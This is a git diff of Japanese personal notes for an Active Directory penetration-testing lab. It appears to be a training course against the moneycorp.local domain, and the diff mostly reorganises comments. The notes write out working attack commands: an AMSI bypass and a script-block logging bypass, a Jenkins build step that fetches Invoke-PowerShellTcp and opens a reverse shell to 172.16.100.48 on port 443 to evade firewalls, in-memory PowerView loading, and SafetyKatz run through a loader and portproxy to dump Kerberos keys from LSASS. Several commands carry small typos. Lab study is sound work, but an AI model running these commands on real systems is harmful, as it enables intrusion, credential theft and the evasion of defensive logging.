@@ -12,19 +12,23 @@ nslookup <IP>
 
 ## AD-Moduleの使用
 ```
+# ADモジュールの.NETアセンブリ(DLL)を読み込み
 Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
 
+# ADモジュールのメインモジュール(マニフェスト)を読み込み。通常のADモジュールと違いオフラインで動作
 Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
 ```
 
 ### User情報
 ```
-Get-ADUser -Filter * 		# 大量の情報が出るので見やすくするため以下コマンドを使用
+Get-ADUser -Filter * 		
 
-Get-ADUser -Filter * | Select-Object SamAccountName, Enabled, SID	# 説明も見たいので以下コマンド
+# 大量の情報が出るので見やすくするため以下コマンドを使用
+Get-ADUser -Filter * | Select-Object SamAccountName, Enabled, SID	
 
-Get-ADUser -Filter * -Properties *	# properties引数が無い時より細部が表示
+# 説明も見たいので以下コマンド(properties引数が無い時より細部が表示)
 
+Get-ADUser -Filter * -Properties *	
 Get-ADUser -Filter * -Properties * | Select-Object SamAccountName, Enabled, SID, Description
 ```
 
@@ -34,11 +38,12 @@ Get-ADDomain
 
 Get-ADDomain | Format-List PDCEmulator, DomainSID, DNSRoot, NetBIOSName
 
-Get-ADDomainController | Select-Object Name, Domain	# ドメインコントローラー情報
+# ドメインコントローラー情報
+Get-ADDomainController | Select-Object Name, Domain	
 
-Get-ADTrust -Filter * | Select-Object Target, Direction, TrustType	# 信頼の方向
+# 信頼の方向
+Get-ADTrust -Filter * | Select-Object Target, Direction, TrustType	```
 ```
-
 ### Forest情報
 ```
 $forest = Get-ADForest
@@ -52,7 +57,9 @@ $forest.GlobalCatalogs
 ```bash
 Get-ADGroup -Filter * | Select-Object SamAccountName, SID, GroupScope
 
-Get-ADGroupMember -Identity Administrators | Select Name, ObjectClass	# 以下のエラー発生（カレントドメインはAdminがいるドメインではない）
+Get-ADGroupMember -Identity Administrators | Select Name, ObjectClass	
+
+# 以下のエラー発生（カレントドメインはAdminがいるドメインではない）
 -----------------------------------------------------------
 Get-ADGroupMember : A referral was returned from the server
 At line:1 char:1
@@ -61,7 +68,10 @@ At line:1 char:1
     + CategoryInfo          : NotSpecified: (Administrators:ADGroup) [Get-ADGroupMember], ADException
     + FullyQualifiedErrorId : ActiveDirectoryServer:8235,Microsoft.ActiveDirectory.Management.Commands.GetADGroupMember
 -----------------------------------------------------------
-Get-ADGroupMember -Identity Administrators -Server moneycorp.local | Select Name, ObjectClass	# 認証に失敗してエラーが出る
+```
+```bash
+# 次のコマンドは証に失敗してエラーが出る
+Get-ADGroupMember -Identity Administrators -Server moneycorp.local | Select Name, ObjectClass	
 ```
 
 ### Computer情報
@@ -72,39 +82,32 @@ Get-ADComputer -Filter * | Select-Object SamAccountName, Enabled, SID
 ## PowerViewの使用
 ```bash
 
-. C:\AD\Tools\PowerView.ps1	# PowerViewを読み込む。PowerViewは攻撃に使われるツールとして有名なのでDefenderで検知・ブロックされる
+# PowerViewを読み込む。PowerViewは攻撃に使われるツールとして有名なのでDefenderで検知・ブロックされる
+. C:\AD\Tools\PowerView.ps1	
 
-C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat	# AMSI（アンチ・マルウェア・スキャン・インターフェース）をバイパス
+# AMSI（アンチ・マルウェア・スキャン・インターフェース）をバイパス
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat	
+
 ```
 
 ### PowerViewの読込とユーザー情報
-```
+```bash
 . C:\AD\Tools\PowerView.ps1
 
-Get-DomainUser | Select -ExpandProperty SamAccountName	# プロパティの複数取り出し不可
+# プロパティの複数取り出し不可のためSamAccountNameのみ指定
+Get-DomainUser | Select -ExpandProperty SamAccountName	
 ```
 
 
-## 書き込み権限の悪用
-```
-
-Import-Module C:\AD\Tools\PowerHuntShares.psm1		# モジュールのインポート
-
-Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt	#ADMINS$,C$,AIが判明。隠しフォルダでないAIを探す
-```
-・ブラウザでSMBShareを開きInsecure ACEsを見ればAIフォルダがdcorp-ciにあることが分かる
-
-
-## dcorp-ciの調査
+## 書き込み権限の悪用(ここは正直いらない。スキップする)
 ```bash
+# モジュールのインポート
+Import-Module C:\AD\Tools\PowerHuntShares.psm1		
 
-nslookup dcorp-ci
-
-nmap 172.16.3.11 -Pn -sV -T4
-
-nmap 172.16.3.11 -p 8080 -Pn -A -T5	# titleからJenkinsが判明
+# ADMINS$,C$,AIが判明。隠しフォルダでないAIを探す
+Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt	
 ```
-・ブラウザでhttp://172.16.3.11:8080にアクセス
+・ブラウザでSMBShareを開きInsecure ACEsを見ればAIフォルダがdcorp-ciにあることが分かる(環境の状態によっては表示されないので注意)
 
 
 ====================================================================
@@ -144,6 +147,27 @@ Invoke-PrivescCheck			# StatusがVulnerable - Highを探す
 ======================================================================
 # ラテラルムーブメント（横移動）
 
+## BloodHoundを使用した分析(P11)LO-1
+・管理者としてコマンドプロンプト起動
+・Blood-Hound-win32-x64からBloodHound起動
+```bash
+C:\AD\Tools\BloodHound-masterollectors\SharpHound.exe --collectionmethods
+```
+・WebUI版で最短経路を確認する。
+今回はdcorp-ciから調査する。
+
+
+## dcorp-ciの調査
+```bash
+
+nslookup dcorp-ci
+
+nmap 172.16.3.11 -Pn -sV -T4
+
+nmap 172.16.3.11 -p 8080 -Pn -A -T5	# titleからJenkinsが判明
+```
+・ブラウザでhttp://172.16.3.11:8080にアクセス
+
 
 ## Jenkinsを使用したdcorp-ciへの移動(P39)LO-5
 
@@ -152,7 +176,18 @@ Invoke-PrivescCheck			# StatusがVulnerable - Highを探す
 ・builduserはプロジェクトがあり変更可能なので悪用可能
 ・次のコマンドをセーブする
 ```bash
-powershell.exe iex (iwr http://172.16.100.48/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.48 -Port 443	# ()内のコマンドをメモリ上で即時実行
+# ()内のコマンドをメモリ上で即時実行
+powershell.exe iex (iwr http://172.16.100.48/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.48 -Port 443	
+・ iex: Invoke-Expressionのエイリアス。()内をメモリに読み込み。
+・ iwr: Invoke-WebRequestのエイリアス。Webコンテンツを取得する。
+・ UseBasicParsing: InternetExplorerを使わずシンプルな読み込み。JSが動くのを防止
+・ ;はコマンド連結
+・ Power: Invoke-PowerShellTcp内で定義されたリバースシェル関数。
+・ Reverse: 標的から攻撃者に接続
+・ IPAddress: C2サーバー
+・ Port: 443でHTTPSを偽装しFW回避
+
+
 ```
 ・HFSを起動しダウンロードさせるファイルを準備
 ・netcatで接続を待ち受け
@@ -162,27 +197,38 @@ powershell.exe iex (iwr http://172.16.100.48/Invoke-PowerShellTcp.ps1 -UseBasicP
 ## dcorp-ciからのdcorp-mgmtアクセス(P48)LO-7
 
 ```bash
-iex (iwr http://172.16.100.48/sbloggingbypass.txt -UseBasicParsing)	# 拡張ログ（P/S実行内容を記録する監査ログ）をバイパス
 
-iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.48/PowerView.ps1'))	# Defenderで検知ブロックされる(メモリ内実行)
+# 拡張ログ（P/S実行内容を記録する監査ログ）をバイパス
+iex (iwr http://172.16.100.48/sbloggingbypass.txt -UseBasicParsing)	
 
-・iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.48/PowerView.ps1'))を再度実行
-Find-DomainUserLocation		# どの端末にDAがいるか調べるコマンド。数分かかる
+# 次のコマンドはDefenderで検知ブロックされる(メモリ内実行)
+iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.48/PowerView.ps1'))	
 
-winrs -r:dcorp-mgmt cmd /c "set computername && set username"	# winrsが有効か＆コマンド実行の可否を調べる
+# 再度コマンド実行
+・iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.48/PowerView.ps1'))
 
+# どの端末にDAがいるか調べるコマンド。数分かかる
+Find-DomainUserLocation		
+
+# winrsが有効か＆コマンド実行の可否を調べる
+winrs -r:dcorp-mgmt cmd /c "set computername && set username"	
 ```
 
 ## dcorp-mgmtからクレデンシャル窃取(P49)LO-7
 
 ```bash
-iwr http://172.16.100.48/Loader.exe -OutFile C:\Users\Public\Loader.exe		# Loader.exeをダウンロード。Loader.exeはローダー実行ファイル
 
-echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe	# Loader.exeをターゲット(dcorp-mgmt)に配送
+# Loader.exeをダウンロード。Loader.exeはローダー実行ファイル
+iwr http://172.16.100.48/Loader.exe -OutFile C:\Users\Public\Loader.exe		
 
-$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"	# $nullは外部コマンド実行時の起動バナー等不要表示を出力しないようにするためにつけている。
+# Loader.exeをターゲット(dcorp-mgmt)に配送
+echo F | xcopy C:\Users\Public\Loader.exe  \\dcorp-mgmt\C$\Users\Public\Loader.exe	
 
-$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"	# SafetyKatzスクリプトをロードしメモリ上で実行。LSASSからKeroberos復号キー取得
+# $nullは外部コマンド実行時の起動バナー等不要表示を出力しないようにするためにつけている。
+$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"	
+
+# SafetyKatzスクリプトをロードしメモリ上で実行。LSASSからKeroberos復号キー取得
+j$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"	
 
 ```
 
